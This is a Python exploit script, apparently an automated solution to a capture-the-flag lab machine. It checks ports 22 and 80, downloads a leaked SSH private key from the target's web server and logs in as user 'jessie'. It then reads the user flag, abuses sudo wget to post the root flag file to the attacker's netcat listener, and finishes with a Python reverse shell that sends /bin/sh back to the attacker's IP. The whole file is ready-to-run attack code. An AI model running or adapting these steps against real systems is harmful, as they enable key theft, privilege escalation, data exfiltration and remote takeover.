import socket
import urllib3
import os
import paramiko
import subprocess
import sys
from time import sleep


def usage():
    print(f'python3 {sys.argv[0]} <REMOTE_MACHINE_IP> <YOUR_MACHINE_IP>')
    exit(-1)


if len(sys.argv) != 3:
    usage()

HOST = sys.argv[1]
LOCAL_IP = sys.argv[2]
LOCAL_PORT = 4242
PORTS = [22, 80]
SSH_KEY = 'id_rsa'
USERNAME = 'jessie'


for port in PORTS:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print(f'[=] Testing for open port {port}')
    err_indicator = s.connect_ex((HOST, port))

    if err_indicator == 0:
        print(f'[+] Port {port} is open.')
    else:
        print(f'[-] Port {port} is closed. Exiting.')
        exit(-1)

    s.close()


# Saving 'id_rsa' file
resp = urllib3.request('GET', f'http://{HOST}/sitemap/.ssh/{SSH_KEY}')

f = os.open('./id_rsa', os.O_CREAT | os.O_WRONLY, mode=0o600)
os.pwrite(f, resp.data, 0)
os.close(f)


# Preparing for root access
# Run nc in background
nc_process = subprocess.Popen(f"nc -nvlp {LOCAL_PORT}".split(' '))


# ssh
ssh = paramiko.SSHClient()

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(HOST, username=USERNAME, key_filename=f'./{SSH_KEY}')
ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(
    "cat ~/Documents/user_flag.txt"
)
print("Useflag: " + ssh_stdout.readline())

ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(
    f"sudo -u root /usr/bin/wget --post-file=/root/root_flag.txt {LOCAL_IP}:{LOCAL_PORT}"
)
sleep(3)
nc_process.terminate()


nc_process = subprocess.Popen(f"nc -nvlp {LOCAL_PORT}".split(' '))

ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(
    f"export RHOST=\"{LOCAL_IP}\";export RPORT={LOCAL_PORT};python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
)

print('\nHere is a shell. \n')
nc_process.communicate()
nc_process.terminate()
